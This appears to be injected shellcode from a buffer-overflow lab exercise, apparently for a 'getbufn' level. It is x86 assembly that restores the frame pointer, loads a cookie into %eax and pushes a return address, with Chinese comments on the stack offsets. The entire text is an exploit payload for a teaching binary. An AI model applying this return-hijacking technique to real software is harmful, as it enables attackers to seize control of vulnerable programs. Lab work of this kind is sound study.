leal 0x28(%esp), %ebp /* 调用getbufn前，ebp与esp相差0x28, call会将调用者下一指令入栈，此时ebp与esp相差0x2c，ret返回时leave包含pop，因此实际ret时相差0x28 */
movl $0x525bbdb4, %eax /* cookie */
push $0x08048e3a /* 返回地址 */
ret
